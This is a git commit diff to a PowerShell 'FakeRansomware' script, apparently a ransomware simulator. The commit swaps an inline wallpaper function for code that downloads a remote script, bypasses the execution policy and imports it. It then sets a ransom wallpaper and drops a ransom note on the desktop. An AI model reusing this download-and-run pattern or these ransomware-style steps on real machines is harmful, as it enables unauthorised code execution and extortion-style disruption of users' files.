13efaadf6d0a4bd42826e3296cc3c57354994e40
Andreas Mouritsen <77634312+Andreas6920@users.noreply.github.com>
2022-12-29 00:21:27 +0100

    code cleanup
    70% code reduced.

--- FakeRansomware.ps1
+++ FakeRansomware.ps1
@@ -50,141 +50,19 @@ Add-Content -Path $path -Value $encryptedcontent
 }}
 
 #Wallpaper
-Function Set-WallPaper {
+    
+    #Download and import Wallpaper script
+    $link = "https://raw.githubusercontent.com/Andreas6920/FakeRansomware/main/resources/set-wallpaper.ps1"
+    $path = $($env:ProgramData)+"\Andreas6920\Set-Wallpaper.ps1"
+    (New-Object net.webclient).Downloadfile("$link", "$path");
+    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+    Import-Module $path
 
-param (
-[parameter(Mandatory=$True)]
-# Provide path to image
-[string]$Image,
-# Provide wallpaper style that you would like applied
-[parameter(Mandatory=$False)]
-[ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
-[string]$Style
-)
+    #Set wallpaper
+    Set-WallPaper -Image $wallpaper -Style Stretch | Out-Null
 
-$WallpaperStyle = Switch ($Style) {
-
-"Fill" {"10"}
-"Fit" {"6"}
-"Stretch" {"2"}
-"Tile" {"0"}
-"Center" {"0"}
-"Span" {"22"}
-
-}
-
-If($Style -eq "Tile") {
-
-New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
-
-}
-Else {
-
-New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
-
-}
-
-Add-Type -TypeDefinition @" 
-using System; 
-using System.Runtime.InteropServices;
-
-public class Params
-{ 
-[DllImport("User32.dll",CharSet=CharSet.Unicode)] 
-public static extern int SystemParametersInfo (Int32 uAction, 
-                                               Int32 uParam, 
-                                               String lpvParam, 
-                                               Int32 fuWinIni);
-}
-"@ 
-
-$SPI_SETDESKWALLPAPER = 0x0014
-$UpdateIniFile = 0x01
-$SendChangeEvent = 0x02
-
-$fWinIni = $UpdateIniFile -bor $SendChangeEvent
-
-$ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
-}
-
-Function Set-WallPaper {
-
-param (
-[parameter(Mandatory=$True)]
-# Provide path to image
-[string]$Image,
-# Provide wallpaper style that you would like applied
-[parameter(Mandatory=$False)]
-[ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
-[string]$Style
-)
-
-$WallpaperStyle = Switch ($Style) {
-
-"Fill" {"10"}
-"Fit" {"6"}
-"Stretch" {"2"}
-"Tile" {"0"}
-"Center" {"0"}
-"Span" {"22"}
-
-}
-
-If($Style -eq "Tile") {
-
-New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
-
-}
-Else {
-
-New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
-
-}
-
-Add-Type -TypeDefinition @" 
-using System; 
-using System.Runtime.InteropServices;
-
-public class Params
-{ 
-[DllImport("User32.dll",CharSet=CharSet.Unicode)] 
-public static extern int SystemParametersInfo (Int32 uAction, 
-                                               Int32 uParam, 
-                                               String lpvParam, 
-                                               Int32 fuWinIni);
-}
-"@ 
-
-$SPI_SETDESKWALLPAPER = 0x0014
-$UpdateIniFile = 0x01
-$SendChangeEvent = 0x02
-
-$fWinIni = $UpdateIniFile -bor $SendChangeEvent
-
-$ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
-}
-
-
-Set-WallPaper -Image $wallpaper -Style Stretch | Out-Null
-
-
-$note = "$folder_base\READ_ME.txt"
-$targetdir = [Environment]::GetFolderPath("Desktop")
-$backupdir = [Environment]::GetFolderPath("MyDocuments") + "\backup"
-
-Copy-Item -Path $note -Destination $targetdir | Out-Null
-
-
-
-
-
-
-
-write-host "your data is safe. check $backup_folder" -f Yellow
+    # Leave Ransom Note
+    Copy-Item -Path $note -Destination $targetdir | Out-Null
 
 $intro = 
 '
